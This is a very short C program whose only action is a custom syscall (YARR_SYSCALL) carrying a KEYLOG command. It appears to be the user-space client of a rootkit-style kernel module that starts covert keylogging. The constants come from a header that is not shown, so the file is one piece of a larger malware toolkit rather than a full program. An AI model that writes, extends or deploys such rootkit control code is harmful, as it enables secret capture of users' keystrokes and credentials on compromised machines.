#include <unistd.h>

#include "types.h"

int main(int argc, char *argv[]) {
	syscall(YARR_SYSCALL, KEYLOG, NULL);
	return 0;
}

